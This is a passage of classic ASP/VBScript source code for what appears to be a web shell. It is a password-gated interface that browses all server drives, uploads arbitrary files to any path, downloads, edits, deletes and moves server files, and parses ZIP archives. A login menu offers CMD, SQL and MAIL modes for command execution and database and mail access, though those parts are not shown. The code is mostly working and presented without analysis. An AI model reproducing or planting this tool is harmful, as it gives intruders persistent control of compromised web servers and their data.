Response.Write " <td><input type=checkbox name=d value=""" & item.Name & """><input type=button value=Ren onclick=""Command('RenameFolder',"" & item.Name & "")""><input type=button value=Attr onclick=""Command('ChangeAttributesFolder',"" & item.Name & "")""></td>" & vbNewLine
Response.Write "</tr>" & vbNewLine
next
for each item in objFolder.Files
count=count+1
Response.Write "<tr>" & vbNewLine
Response.Write " <td><a href=""javascript:Command('Download',"" & item.Name & "")"""
ext=FSO.GetExtensionName(addslash(targetPath) & item.Name)
re.IgnoreCase = true
re.Pattern = "^" & ext & ",|," & ext & ",|," & ext & "$"
if re.Test(lnkExt) then
Response.Write " title=""-> " & Server.Htmlencode(FindLink(addslash(targetPath) & item.Name)) & """"
elseif Len(item.Name)>gMax then
Response.Write " title=""" & item.Name & """"
end if

Response.Write ">" & FormatName(item.Name) & "</td>" & vbNewLine
Response.Write " <td align=right>" & FormatSize(item.Size) & "</td>" & vbNewLine
Response.Write " <td align=center>" & item.Type & "</td>" & vbNewLine
Response.Write " <td align=center>" & FormatDate(item.DateLastModified ) & "</td>" & vbNewLine
Response.Write " <td>" & GetAttributes(item.Attributes) & "</td>" & vbNewLine
Response.Write " <td><input type=checkbox name=f value=""" & item.Name & """><input type=button value=Ren onclick=""Command('RenameFile',"" & item.Name & "")""><input type=button value=Attr onclick=""Command('ChangeAttributesFile',"" & item.Name & "")"">"

if re.Test(editExt) then
Response.Write "<input type=button value=Edit onclick=""Command('Edit',"" & item.Name & "")"">"
end if

if Lcase(ext)="zip" then
Response.Write "<input type=button value=Info onclick=""Command('ZipInfo',"" & item.Name & "")"">"
end if

Response.Write "</td>" & vbNewLine
Response.Write "</tr>" & vbNewLine
next
if count>0 then
%>
<tr>
<td> </td>
<td> </td>
<td> </td>
<td> </td>
<td> </td>
<td><input type=checkbox name=allbox title="Select All" onclick="CheckAll()"><input type=button value=Delete title="Delete Selected Item(s)" onclick="DoWork('Delete')"></td>
</tr>
<%
end if
%>
</table>
<%
if count>1 then
%>
<p>
<table>
<tr><td><b>C</b>opy selected item(s) to</td><td><input type=text name=cp value="<%=Session("cp_dst")%>" size=50 onkeydown=" if (event.keyCode==13) theForm.cp_bt.click();"> <input type=button id=cp_bt value=Copy onclick="DoWork('Copy')"></td></tr>
<tr><td><b>M</b>ove selected item(s) to</td><td><input type=text name=mv value="<%=Session("mv_dst")%>" size=50 onkeydown=" if (event.keyCode==13) theForm.mv_bt.click();"> <input type="button" id=mv_bt value=Move onclick="DoWork('Move')"></td></tr>
</table>
<%
end if
%>
</form>
</table>
<%
end if
set objFolder=nothing
%>
<p><b>U</b>pload file(s) to "<%=targetPath%>"
<form name=frmUpload method=post enctype="multipart/form-data" action="<%=gURL%>">
<input type=hidden name=folder value="<%=targetPath%>">
Max: <input type=text name=max value=5 size=5> <input type=button value=# onclick="setid()"><br>
<table>
<tr>
<td id=upid>
</td>
</tr>
</table>
<input type=submit value=Upload>
</form>
<script>
setid();
function setid() {
str='<br>';
if (frmUpload.max.value<=0) frmUpload.max.value=1;
for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';
upid.innerHTML=str+'<br>';
}
</script>
<%
end if
%>
<form name=frmFile method=post action="<%=gURL%>">
<input type=hidden name=command value="">
<input type=hidden name=param value="">
<input type=hidden name=folder value="<%=targetPath%>">
</form>
<script>frmAddress.param.focus()</script>
<%
HtmlJsCommand()
end sub

'###########################################################################################

sub Upload()
dim objUpload,f,max,i,name,path,size,success

HtmlHeader("")
HtmlMode()

set objUpload=New clsUpload

targetPath=objUpload.Fields("folder").Value
max=objUpload.Fields("max").Value

gMsg= "<b>U</b>pload..." & vbNewLine

for i=1 to max
name=objUpload.Fields("file" & i).FileName
size=objUpload.Fields("file" & i).Length
if (name<>"") and (size>0) then
gMsg=gMsg & "<br>" & vbNewLine & "- " & name & " (" & FormatNumber(size,0) & " bytes): "
path=addslash(targetPath) & name
objUpload.Fields("file" & i).SaveAs path
if FSO.FileExists(path) then
on error resume next
set f=FSO.GetFile(path)
if IsObject(f) then
if f.Size=size then success=true else success=false
end if
set f=nothing
end if
if success then gMsg=gMsg & "success" else gMsg = gMsg & "fail"
end if
next

set objUpload=nothing

List()
HtmlFooter()
Destroy()
end sub

'###########################################################################################

sub Download()
dim oStream
dim szFileName
szFileName=addslash(Request.Form("folder")) & Request.form("Param")
if FSO.FileExists(szFileName) then
set oStream=Server.CreateObject("ADODB.Stream")
oStream.Type=1
oStream.Open
on error resume next
oStream.LoadFromFile(szFileName)
if Err.Number=0 then
Response.AddHeader "Content-Disposition", "attachment; filename=" & FSO.GetFileName(szFileName)
Response.AddHeader "Content-Length", oStream.Size
Response.ContentType="bad/type" 'yeu cau ie hien hop thoai save-as
Response.BinaryWrite oStream.Read
end if
oStream.Close
set oStream=nothing
end if
Destroy()
end sub

'###########################################################################################

sub Logout()
Session.Abandon
Response.Redirect gURL
Destroy()
end sub

sub Init()
Session("switch")=false
set FSO=Server.CreateObject("Scripting.FileSystemObject")
set re=new regexp
end sub

sub Destroy()
set FSO=nothing
set re=nothing
Response.End
end sub

'###########################################################################################

sub Secure()
if (Session("allow")=1) then exit sub
if (gPassword="") then
Session("allow")=1
Session("mode")=0
exit sub
end if
if (Request.Form("command")="Login") then
if Request.Form("password")=gPassword then
Session("allow")=1
Session("mode")=CInt(Request.Form("mode"))
exit sub
end if
end if

HtmlHeader("")
%>
<form name=frmLogin method=post action="<%=gURL%>">
<table>
<tr>
<td><b>M</b>ode:</td>
<td>
<select name=mode>
<option value=0 selected>FILE
<option value=1>CMD
<option value=2>SQL
<option value=3>MAIL
</select>
</td>
</tr>
<tr>
<td><b>P</b>assword:</td>
<td><input type=password name=password></td>
</tr>
<tr>
<td colspan=2><input type=submit name=command value=Login></td>
</tr>
</table>
</form>
<script>frmLogin.password.focus()</script>
<%
HtmlFooter()
Destroy()
end sub

'###########################################################################################

sub HtmlJsForm()
%>
<script>
function CheckAll() {
var fmobj=document.theForm;
for (var i=0; i<fmobj.elements.length;i++) {
var e=fmobj.elements<i>;
if ((e.name!='allbox') && (e.type=='checkbox') && (!e.disabled)) {
e.checked=fmobj.allbox.checked;
}
}
if (fmobj.allbox.checked) {
fmobj.allbox.title='Clear All';
} else {
fmobj.allbox.title='Select All';
}
}

function DoWork(cmd) {
var s;
var fmobj=document.theForm;
var total=0;
for (var i=0; i<fmobj.elements.length; i++) {
var e=fmobj.elements<i>;
if ((e.name!='allbox') && (e.type=='checkbox') && (e.checked)) total++;
}

if (total<1) return;

s=(total>1)?'s':'';

switch (cmd) {
case "Delete":
if (!confirm('Are you sure to delete ' + total + ' selected item' + s + ' ?')) return;
break;
case "Move":
var mv=fmobj.mv.value;
var re1=/^\s*[A-Z]{1}:[^\"\*\?\<\>\|]*\s*$/gi;
var re2=/^\s*:{1}[^\s]+/gi;
if (mv=='') return;
if ( re1.test(mv) || re2.test(mv) ){
if (!confirm('Are you sure to move ' + total + ' selected item' + s + ' to "' + mv + '" ?')) return;
} else {
alert('Invalid path name !');
return;
}
break;
case "Copy":
var cp=fmobj.cp.value;
var re1=/^\s*[A-Z]{1}:[^\"\*\?\<\>\|]*\s*$/gi;
var re2=/^\s*:{1}[^\s]+/gi;
if (cp=='') return;
if ( re1.test(cp) || re2.test(cp) ) {
} else {
alert('Invalid path name !');
return;
}
break;
default:
return;
}

fmobj.command.value=cmd;
fmobj.submit();
}
</script>
<%
end sub

'###########################################################################################

sub HtmlJsCommand()
%>
<script>
function openWin(winName, urlLoc, w, h, showStatus, isViewer) {
l = (screen.availWidth - w)/2;
t = (screen.availHeight - h)/2;
features = "toolbar=no"; // yes|no 
features += ",location=no"; // yes|no 
features += ",directories=no"; // yes|no 
features += ",status=" + (showStatus?"yes":"no"); // yes|no 
features += ",menubar=no"; // yes|no 
features += ",scrollbars=" + (isViewer?"yes":"no"); // auto|yes|no 
features += ",resizable=" + (isViewer?"yes":"no"); // yes|no 
features += ",dependent"; // close the parent, close the popup, omit if you want otherwise 
features += ",height=" + h;
features += ",width=" + w;
features += ",left=" + l;
features += ",top=" + t;
winName = winName.replace(/[^a-z]/gi,"_");
return window.open(urlLoc,winName,features);
} 

function createPage (theWin, cmd, param){
frmFile.target = theWin.name;
frmFile.command.value = cmd;
frmFile.param.value = param;
frmFile.submit();
}

function CheckName(str) {
var re;
re = /[\\/:*?"<>|]/gi;
if (re.test(str)) return false; 
else return true;
} 

function Command(cmd, param) {
var str;
var someWin;
switch (cmd) {
case "Tree":
str = prompt("Please enter a name for the folder to tree", frmFile.folder.value);
if (!str) return;
var re1=/^\s*[A-Z]{1}:[^\"\*\?\<\>\|]*\s*$/gi;
var re2=/^\s*:{1}[^\s]+/gi;
if (re1.test(str) || re2.test(str)) {
var winName=cmd + document.forms.frmFile.param.value;
param=str;
document.forms.frmFile.param.value=param;
winName=winName.replace(/[^a-z]/gi,"_");
someWin=window.open("", winName, "toolbar=yes,location=no,directories=no,status=yes,menubar=yes,scrollbars=yes,resizable=yes");
someWin.focus();
createPage(someWin,cmd,param);
someWin = null;
return;
}
else {
alert('Invalid path name !');
return;
}
break;
case "NewFile":
str = prompt("Please enter a name for the new file", "New File");
if(!str) return;
else if (!CheckName(str)) {alert("File name can not contain any of the\nfollowing characters: \\ / : * ? \" < > |"); return;}
frmFile.param.value = str;
break;
case "NewFolder":
str = prompt("Please enter a name for the new folder", "New Folder");
if(!str) return;
else if (!CheckName(str)) {alert("Folder name can not contain any of the\nfollowing characters: \\ / : * ? \" < > |"); return;}
frmFile.param.value = str;
break;
case "RenameFile":
str = prompt("Please enter the new name for the file", param);
if (!str || (str==param)) return;
else if (!CheckName(str)) {alert("File name can not contain any of the\nfollowing characters: \\ / : * ? \" < > |"); return;}
frmFile.param.value = param + "|" + str;
break;
case "RenameFolder":
str = prompt("Please enter the new name for the folder", param);
if (!str || (str==param)) return;
else if (!CheckName(str)) {alert("Folder name can not contain any of the\nfollowing characters: \\ / : * ? \" < > |"); return;}
frmFile.param.value = param + "|" + str;
break;
case "Edit":
str = frmFile.folder.value + param;
someWin = openWin(cmd + str, "", 600, 440, true, false);
someWin.focus();
createPage(someWin,cmd,param);
someWin = null;
return;
break;
case "ChangeAttributesFile":
case "ChangeAttributesFolder":
str = frmFile.folder.value + param;
someWin = openWin(cmd + str, "", 300, 160, true, false);
someWin.focus();
createPage(someWin,cmd,param);
someWin = null;
return;
break;
case "ZipInfo":
var winName=cmd + document.forms.frmFile.folder.value + param;
winName=winName.replace(/[^a-z]/gi,"_");
someWin=window.open("", winName, "toolbar=yes,location=no,directories=no,status=yes,menubar=yes,scrollbars=yes,resizable=yes");
someWin.focus();
createPage(someWin,cmd,param);
someWin = null;
return;
break
default:
frmFile.param.value = param;
}
frmFile.target = "";
frmFile.command.value = cmd
frmFile.submit(); 
}
</script>
<%
end sub

sub HtmlJsEditor()
%>
<script>
function EditorCommand (cmd) {
switch (cmd) {
case "WordWrap":
if (frmFile.wrap.checked) frmFile.content.wrap="soft";
else frmFile.content.wrap="off";
frmFile.content.focus();
break;
case "Reload":
frmFile.reset();
break;
case "Save":
frmFile.subcommand.value = "Save";
frmFile.submit();
break;
case "SaveAs":
var str, oldname;
oldname = frmFile.param.value;
str = prompt("Save the file as :", oldname);
if (!str || str==oldname) return;
frmFile.param.value = str;
frmFile.subcommand.value = "SaveAs";
frmFile.submit();
break;
}
}
</script>
<%
end sub

sub HtmlQuick()
%>
<form name=frmQuick method=post action="<%=gURL%>">
<input type=hidden name=command value=OpenFolder>
<select name=param onchange="frmQuick.submit()">
<%
dim dc,d,dName,dType
set dc=FSO.Drives
for each d in dc
dName=d.DriveLetter&":\"
select case d.DriveType
case 0 dType="Unknown"
case 1 if d.driveletter="A" then dType="?" else dType="?"
dType=dType&" Floppy" 'maybe wrong
case 2 dType="HDD " & FormatSize(d.TotalSize)
case 3 dType="Network"
case 4
dType="CD-ROM"
if not d.IsReady then dType=dType & " - not ready"
case 5
dType="RAM Disk"
end select
Response.Write "<option value=""" & dName & """"
if d.DriveLetter=Ucase(Left(targetPath,1)) then Response.Write " selected"
Response.Write ">" & dName& " (" & dType & ")" & vbNewLine
next
set dc=nothing
%>
</select>
</form>
<form name=frmAddress method=post action="<%=gURL%>">
<input type=hidden name=command value=OpenFolder>
<b>A</b>ddress: <input type=text name=param value="<%=targetPath%>" size=90> <input type=submit value=Go>
</form>
<%
end sub

sub HtmlMode()
%>
<table>
<tr>
<td>
<form name=frmChangeMode method=post action="<%=gURL%>">
<input type=hidden name=command value=ChangeMode>
<select name=mode onchange="frmChangeMode.submit()">
<option value=0<%if Session("mode")=0 then Response.Write " selected"%>>FILE
<option value=1<%if Session("mode")=1 then Response.Write " selected"%>>CMD
<option value=2<%if Session("mode")=2 then Response.Write " selected"%>>SQL
<option value=3<%if Session("mode")=3 then Response.Write " selected"%>>MAIL
</select>
</form>
</td>
<%
if gPassword<>"" then
%>
<td>
<form name=frmLogout method=post action="<%=gURL%>">
<input type=submit name=command value=Logout>
</form>
</td>
<%
end if
%>
</tr>
</table>
<%
end sub

'###########################################################################################

sub HtmlHeader(strTitle)
%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><%=strTitle%></title>
<style>
select,input{font-family:Verdana;font-size:9pt}
</style>
</head>
<body>
<%
end sub

'###########################################################################################

sub HtmlFooter()
%>
</body>
</html>
<%
end sub

'###########################################################################################

function abspath(path)
if left(path,1)=":" then abspath=Server.MapPath(mid(path,2)) else abspath=FSO.GetAbsolutePathName(path)
end function

'###########################################################################################

function addslash(path)
if right(path,1)="\" then addslash=path else addslash=path & "\"
end function

'###########################################################################################

function findroot(path)
dim f

set f=FSO.GetFolder(path)

if f.IsRootFolder then
else
do until f.IsRootFolder
set f=f.ParentFolder
loop
end if
findroot=f.Path
set f=nothing
end function

'###########################################################################################

function isroot(path)
dim f
set f=FSO.GetFolder(path)
isroot=f.IsRootFolder
set f=nothing
end function

'###########################################################################################

Function FindLink(szFileName)
Dim WshShell, oLink

Set WshShell=Server.CreateObject("WScript.Shell")
Set oLink=WshShell.CreateShortcut(szFileName)

FindLink=oLink.TargetPath

Set oLink=Nothing
Set WshShell=Nothing
End Function

'###########################################################################################

Function FormatSize(intSize)
If (intSize < 1024) Then
FormatSize = intSize & " B"
ElseIf (intSize < 1024*1024) Then
FormatSize = FormatNumber(intSize/1024,2) & " KB"
ElseIf (intSize < 1024*1024*1024) Then
FormatSize = FormatNumber(intSize/(1024*1024),2) & " MB"
Else
FormatSize = FormatNumber(intSize/(1024*1024*1024),2) & " GB"
End If
End Function

'###########################################################################################

Function FormatName(szName)
FormatName = szName
If gMax > 5 And Len(szName) > gMax Then FormatName = Left(szName,gMax-2) & "..."
End Function

'###########################################################################################

function FormatDate(strDate)
dim int12HourPart,strAMPM
int12HourPart=DatePart("h",strDate) mod 12
if int12HourPart=0 then int12HourPart=12
if DatePart("h",strDate)>=12 then strAMPM="PM" else strAMPM="AM"
FormatDate=Right("0"&DatePart("d",strDate),2) & "/" & Right("0"&DatePart("m",strDate),2) & "/" & DatePart("yyyy",strDate) & " " & Right("0"&int12HourPart,2) & ":" & Right("0"&DatePart("n",strDate),2) & ":" & Right("0"&DatePart("s",strDate),2) & " " & strAMPM
end function

'###########################################################################################

Function GetAttributes(intAttr)
Dim strAttributes
strAttributes=""
If (intAttr And 1) > 0 Then strAttributes = "R"
If (intAttr And 2) > 0 Then strAttributes=strAttributes & "H"
If (intAttr And 4) > 0 Then strAttributes=strAttributes & "S"
If (intAttr And 32) > 0 Then strAttributes=strAttributes & "A"
If (intAttr And 2048) > 0 Then strAttributes=strAttributes & "C"
if strAttributes="" then strAttributes=" "
GetAttributes=strAttributes
End Function

'###########################################################################################

Class clsField
Public Name
Private mstrPath
Public FileDir
Public FileExt
Public FileName
Public ContentType
Public Value
Public BinaryData
Public Length
Private mstrText

Public Property Get BLOB()
BLOB = BinaryData
End Property

Public Function BinaryAsText()
Dim lbinBytes
Dim lobjRs
If Length = 0 Then Exit Function
If LenB(BinaryData) = 0 Then Exit Function

If Not Len(mstrText) = 0 Then
BinaryAsText = mstrText
Exit Function
End If
lbinBytes = ASCII2Bytes(BinaryData)
mstrText = Bytes2Unicode(lbinBytes)
BinaryAsText = mstrText
End Function

Public Sub SaveAs(ByRef pstrFileName)
Const adTypeBinary=1
Const adSaveCreateOverWrite=2
Dim lobjStream
Dim lobjRs
Dim lbinBytes
If Length = 0 Then Exit Sub
If LenB(BinaryData) = 0 Then Exit Sub
Set lobjStream = Server.CreateObject("ADODB.Stream")
lobjStream.Type = adTypeBinary
Call lobjStream.Open()
lbinBytes = ASCII2Bytes(BinaryData)
Call lobjStream.Write(lbinBytes)
On Error Resume Next
Call lobjStream.SaveToFile(pstrFileName, adSaveCreateOverWrite)
Call lobjStream.Close()
Set lobjStream = Nothing
End Sub

Public Property Let FilePath(ByRef pstrPath)
mstrPath = pstrPath
If Not InStrRev(pstrPath, ".") = 0 Then
FileExt = Mid(pstrPath, InStrRev(pstrPath, ".") + 1)
FileExt = UCase(FileExt)
End If
If Not InStrRev(pstrPath, "\") = 0 Then
FileName = Mid(pstrPath, InStrRev(pstrPath, "\") + 1)
End If
If Not InStrRev(pstrPath, "\") = 0 Then
FileDir = Mid(pstrPath, 1, InStrRev(pstrPath, "\") - 1)
End If
End Property

Public Property Get FilePath()
FilePath = mstrPath
End Property

Private Function ASCII2Bytes(ByRef pbinBinaryData)
Const adLongVarBinary=205
Dim lobjRs
Dim llngLength
Dim lbinBuffer
llngLength = LenB(pbinBinaryData)
Set lobjRs = Server.CreateObject("ADODB.Recordset")
Call lobjRs.Fields.Append("BinaryData", adLongVarBinary, llngLength)
Call lobjRs.Open()
Call lobjRs.AddNew()
Call lobjRs.Fields("BinaryData").AppendChunk(pbinBinaryData & ChrB(0))
Call lobjRs.Update()
lbinBuffer = lobjRs.Fields("BinaryData").GetChunk(llngLength)
Call lobjRs.Close()
Set lobjRs = Nothing
ASCII2Bytes = lbinBuffer
End Function

Private Function Bytes2Unicode(ByRef pbinBytes)
Dim lobjRs
Dim llngLength
Dim lstrBuffer
llngLength = LenB(pbinBytes)
Set lobjRs = Server.CreateObject("ADODB.Recordset")
Call lobjRs.Fields.Append("BinaryData", adLongVarChar, llngLength)
Call lobjRs.Open()
Call lobjRs.AddNew()
Call lobjRs.Fields("BinaryData").AppendChunk(pbinBytes)
Call lobjRs.Update()
lstrBuffer = lobjRs.Fields("BinaryData").Value
Call lobjRs.Close()
Set lobjRs = Nothing
Bytes2Unicode = lstrBuffer
End Function
End Class

'###########################################################################################

Class clsUpload
Private mbinData
Private mlngChunkIndex
Private mlngBytesReceived
Private mstrDelimiter
Private CR
Private LF
Private CRLF
Private mobjFieldAry()
Private mlngCount

Private Sub RequestData
Dim llngLength
mlngBytesReceived = Request.TotalBytes
mbinData = Request.BinaryRead(mlngBytesReceived)
End Sub

Private Sub ParseDelimiter()
mstrDelimiter = MidB(mbinData, 1, InStrB(1, mbinData, CRLF) - 1)
End Sub

Private Sub ParseData()
Dim llngStart
Dim llngLength
Dim llngEnd
Dim lbinChunk
llngStart = 1
llngStart = InStrB(llngStart, mbinData, mstrDelimiter & CRLF)
While Not llngStart = 0
llngEnd = InStrB(llngStart + 1, mbinData, mstrDelimiter) - 2
llngLength = llngEnd - llngStart
lbinChunk = MidB(mbinData, llngStart, llngLength)
Call ParseChunk(lbinChunk)
llngStart = InStrB(llngStart + 1, mbinData, mstrDelimiter & CRLF)
Wend
End Sub

Private Sub ParseChunk(ByRef pbinChunk)
Dim lstrName
Dim lstrFileName
Dim lstrContentType
Dim lbinData
Dim lstrDisposition
Dim lstrValue
lstrDisposition = ParseDisposition(pbinChunk)
lstrName = ParseName(lstrDisposition)
lstrFileName = ParseFileName(lstrDisposition)
lstrContentType = ParseContentType(pbinChunk)
If lstrContentType = "" Then
lstrValue = CStrU(ParseBinaryData(pbinChunk))
Else
lbinData = ParseBinaryData(pbinChunk)
End If
Call AddField(lstrName, lstrFileName, lstrContentType, lstrValue, lbinData)
End Sub

Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)
Dim lobjField
ReDim Preserve mobjFieldAry(mlngCount)
Set lobjField = New clsField
lobjField.Name = pstrName
lobjField.FilePath = pstrFileName 
lobjField.ContentType = pstrContentType
If LenB(pbinData) = 0 Then
lobjField.BinaryData = ChrB(0)
lobjField.Value = pstrValue
lobjField.Length = Len(pstrValue)
Else
lobjField.BinaryData = pbinData
lobjField.Length = LenB(pbinData)
lobjField.Value = ""
End If
Set mobjFieldAry(mlngCount) = lobjField
mlngCount = mlngCount + 1
End Sub

Private Function ParseBinaryData(ByRef pbinChunk)
Dim llngStart
llngStart = InStrB(1, pbinChunk, CRLF & CRLF)
If llngStart = 0 Then Exit Function
llngStart = llngStart + 4
ParseBinaryData = MidB(pbinChunk, llngStart)
End Function

Private Function ParseContentType(ByRef pbinChunk)
Dim llngStart
Dim llngEnd
Dim llngLength
llngStart = InStrB(1, pbinChunk, CRLF & CStrB("Content-Type:"), vbTextCompare)
If llngStart = 0 Then Exit Function
llngEnd = InStrB(llngStart + 15, pbinChunk, CR)
If llngEnd = 0 Then Exit Function
llngStart = llngStart + 15
If llngStart >= llngEnd Then Exit Function
llngLength = llngEnd - llngStart
ParseContentType = Trim(CStrU(MidB(pbinChunk, llngStart, llngLength)))
End Function

Private Function ParseDisposition(ByRef pbinChunk)
Dim llngStart
Dim llngEnd
Dim llngLength
llngStart = InStrB(1, pbinChunk, CRLF & CStrB("Content-Disposition:"), vbTextCompare)
If llngStart = 0 Then Exit Function
llngEnd = InStrB(llngStart + 22, pbinChunk, CRLF)
If llngEnd = 0 Then Exit Function
llngStart = llngStart + 22
If llngStart >= llngEnd Then Exit Function
llngLength = llngEnd - llngStart
ParseDisposition = CStrU(MidB(pbinChunk, llngStart, llngLength))
End Function

Private Function ParseName(ByRef pstrDisposition)
Dim llngStart
Dim llngEnd
Dim llngLength
llngStart = InStr(1, pstrDisposition, "name=""", vbTextCompare)
If llngStart = 0 Then Exit Function
llngEnd = InStr(llngStart + 6, pstrDisposition, """")
If llngEnd = 0 Then Exit Function
llngStart = llngStart + 6
If llngStart >= llngEnd Then Exit Function
llngLength = llngEnd - llngStart
ParseName = Mid(pstrDisposition, llngStart, llngLength)
End Function
' ------------------------------------------------------------------------------
Private Function ParseFileName(ByRef pstrDisposition)
Dim llngStart
Dim llngEnd
Dim llngLength
llngStart = InStr(1, pstrDisposition, "filename=""", vbTextCompare)
If llngStart = 0 Then Exit Function
llngEnd = InStr(llngStart + 10, pstrDisposition, """")
If llngEnd = 0 Then Exit Function
llngStart = llngStart + 10
If llngStart >= llngEnd Then Exit Function
llngLength = llngEnd - llngStart
ParseFileName = Mid(pstrDisposition, llngStart, llngLength)
End Function

Public Property Get Count()
Count = mlngCount
End Property

Public Default Property Get Fields(ByVal pstrName)
Dim llngIndex
If IsNumeric(pstrName) Then
llngIndex = CLng(pstrName)
If llngIndex > mlngCount - 1 Or llngIndex < 0 Then
Call Err.Raise(vbObjectError + 1, "clsUpload.asp", "Object does not exist within the ordinal reference.")
Exit Property
End If
Set Fields = mobjFieldAry(pstrName)
Else
pstrName = LCase(pstrname)
For llngIndex = 0 To mlngCount - 1
If LCase(mobjFieldAry(llngIndex).Name) = pstrName Then
Set Fields = mobjFieldAry(llngIndex)
Exit Property
End If
Next
End If
Set Fields = New clsField
End Property

Private Sub Class_Terminate()
Dim llngIndex
For llngIndex = 0 To mlngCount - 1
Set mobjFieldAry(llngIndex) = Nothing

Next
ReDim mobjFieldAry(-1)
End Sub

Private Sub Class_Initialize()
ReDim mobjFieldAry(-1)
CR = ChrB(Asc(vbCr))
LF = ChrB(Asc(vbLf))
CRLF = CR & LF
mlngCount = 0
Call RequestData
Call ParseDelimiter()
Call ParseData
End Sub

Private Function CStrU(ByRef pstrANSI)
Dim llngLength
Dim llngIndex
llngLength = LenB(pstrANSI)
For llngIndex = 1 To llngLength
CStrU = CStrU & Chr(AscB(MidB(pstrANSI, llngIndex, 1)))
Next
End Function

Private Function CStrB(ByRef pstrUnicode)
Dim llngLength
Dim llngIndex
llngLength = Len(pstrUnicode)
For llngIndex = 1 To llngLength
CStrB = CStrB & ChrB(Asc(Mid(pstrUnicode, llngIndex, 1)))
Next
End Function
End Class

'###########################################################################################

Class clsZip
Private mbin_Zip
Private mobj_Files()
Private mlng_Files

Sub ZipLoad(pstrFileName)
Dim lobjFSO
Dim llngTristateFalse
Dim llngForReading
dim objStream

mbin_Zip = ""

If pstrFileName = "" Then Exit Sub

If InStr(1, pstrFileName, ":\") = 0 Then
pstrFileName = Server.MapPath(pstrFileName)
End If

Set lobjFSO = Server.CreateObject("Scripting.FileSystemObject")

If lobjFSO.FileExists(pstrFileName) Then
set objStream=Server.CreateObject("ADODB.Stream")
objStream.Type=1
objStream.Open
on error resume next
objStream.LoadFromFile(pstrFileName)
mbin_Zip = objStream.Read
set objStream=nothing
End If

Set lobjFSO = Nothing

Call ParseZips()

End Sub

Public Property Let ZipData(ByRef pbinBinaryData)
mbin_Zip = pbinBinaryData
Call ParseZips()
End Property
Public Property Get FileCount()
FileCount = mlng_Files
End Property
Public Property Get GetFile(ByRef plngIndex)
Set GetFile = mobj_Files(plngIndex-1)
End Property

Private Sub ParseZips()
Dim llngOffSet
mlng_Files = 0
llngOffSet = 0
If LenB(mbin_Zip) = 0 Then Exit Sub
Do
' Find next PK 3.04 record
llngOffset = InStrB(llngOffset + 1, mbin_zip, ChrB(&h50) & ChrB(&h4B) & ChrB(&h03) & ChrB(&h04))
If llngOffset = 0 Then Exit Do
llngOffset = llngOffset - 1
ReDim Preserve mobj_Files(mlng_Files)
Set mobj_Files(mlng_Files) = New clsZipFile
With mobj_Files(mlng_Files)
.Signature = GetString(llngOffset + 1, 2) & " " & CInt(GetHex(llngOffset + 3, 1)) & "." & GetHex(llngOffset + 4, 1)
.ExtractVersion = FormatNumber(GetNumber(llngOffset + 5, 2) * .1, 1, True)
.GeneralPurposeFlags = GetNumber(llngOffset + 7, 2)
.CompressionMethod = GetNumber(llngOffset + 9, 2)
.LastModifiedTime = GetNumber(llngOffset + 11, 2)
.LastModifiedDate = GetNumber(llngOffset + 13, 2)
.CRC32 = GetNumber(llngOffset + 15, 4)
.CompressedSize = GetNumber(llngOffset + 19, 4)
.UncompressedSize = GetNumber(llngOffset + 23, 4)
.FileNameLength = GetNumber(llngOffset + 27, 2)
.ExtraFieldLength = GetNumber(llngOffset + 29, 2)
.FileName = GetString(llngOffset + 31, .FileNameLength)
.ExtraField = GetString(llngOffset + 31 + .FileNameLength, .ExtraFieldLength)
.StartByte = llngOffSet + 1
.EndByte = llngOffSET + .FileNameLength + .ExtraFieldLength + .CompressedSize + 30
' .BinaryData = MidB(pbin_Zip, llngOffSET + .FileNameLength + .ExtraFieldLength + 30, .CompressedSize)
' .LocalFileHeader = GetString(llngOffset + 1, .FileNameLength + .ExtraFieldLength + 30)
llngOffSet = .EndByte
.IsOverall = (.Name = "" And .Path = "")
.IsFolder = (.Name = "" And Not .Path = "")
End With
mlng_Files = mlng_Files + 1
Loop While mobj_Files(mlng_Files - 1).EndByte < LenB(mbin_zip)
End Sub

Private Function GetHex(plngStart, plngLength)
Dim llngIndex
Dim lstrHex
For llngIndex = 0 To plngLength - 1
lstrHex = lstrHex & Right("0" & Hex(AscB(MidB(mbin_zip, plngStart + llngIndex, 1))), 2)
Next
GetHex = lstrHex
End Function

Private Function GetString(plngStart, plngLength)
Dim llngIndex
Dim lstrString
If LenB(mbin_zip) < (plngStart + (plngLength - 1)) Then Exit Function
For llngIndex = 0 To plngLength - 1
If AscB(MidB(mbin_zip, plngStart + llngIndex, 1)) = 0 Then
lstrString = lstrString & " "
Else
lstrString = lstrString & Chr(AscB(MidB(mbin_zip, plngStart + llngIndex, 1)))
End If
Next
GetString = lstrString
End Function

Private Function GetNumber(plngStart, plngLength)
If plngStart < 0 Then Exit Function
Dim llngIndex
Dim lstrHex
For llngIndex = 0 To plngLength - 1
lstrHex = Right("0" & Hex(AscB(MidB(mbin_zip, plngStart + llngIndex, 1))), 2) & lstrHex
Next
GetNumber = CDbl("&h" & lstrHex)
End Function

Function GetDate(plngStart)
Dim llngDate
llngDate = GetNumber(plngStart, 2)
GetDate = DateSerial(1980 + (llngDate And &HFE00) \ &H200, (llngDate And &H1E0) \ &H20, llngDate And &H1F)
End Function

Function GetTime(plngStart)
Dim llngDate
llngDate = GetNumber(plngStart, 2)
GetTime = TimeSerial((llngDate And &HF800) \ &H800, (llngDate And &H7E0) \ &H20, (llngDate And &H1F) * 2)
End Function
End Class

Class clsZipFile
Public Signature
Public ExtractVersion
Public GeneralPurposeFlags
Public CompressionMethod
Public LastModifiedTime
Public LastModifiedDate
Public CRC32
Public CompressedSize
Public UncompressedSize
Public FileNameLength
Public ExtraFieldLength
Public FileName
Public ExtraField
Public StartByte
Public EndByte
Public BinaryData
Public LocalFileHeader

Public IsFolder
Public IsOverall

Public Property Get Name
Dim lstrPath
lstrPath = Replace(FileName, "/", "\")
If InStr(1, lstrPath, "\") = "0" Then
Name = lstrPath
Exit Property
End If
Name = Mid(lstrPath, InStrRev(lstrPath, "\") + 1)
End Property

Public Property Get Path
Dim lstrPath
lstrPath = Replace(FileName, "/", "\")
If InStr(1, lstrPath, "\") = "0" Then
Path = ""
Exit Property
End If
Path = Mid(lstrPath, 1, InStrRev(lstrPath, "\"))
End Property

Public Property Get Packed
Packed = CompressedSize
End Property

Public Property Get Ratio
If UncompressedSize = 0 Then Exit Property
If CompressedSize >= UncompressedSize Then
Ratio = "0%"
Else
